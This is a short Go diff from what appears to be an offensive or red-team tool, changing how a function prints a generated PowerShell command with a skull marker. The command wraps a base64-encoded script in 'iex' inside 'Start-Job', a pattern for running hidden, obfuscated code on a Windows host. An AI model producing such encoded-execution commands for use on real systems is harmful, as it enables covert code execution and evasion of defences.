@@ -353,7 +353,7 @@ func Hosts() {
 	encoded := base64.StdEncoding.EncodeToString(strbytes)
 	// fmt.Println(encoded)
 	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
-	fmt.Println(commandJ)
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
 }
 
 func Options() { //定义tab 下拉菜单选项参数
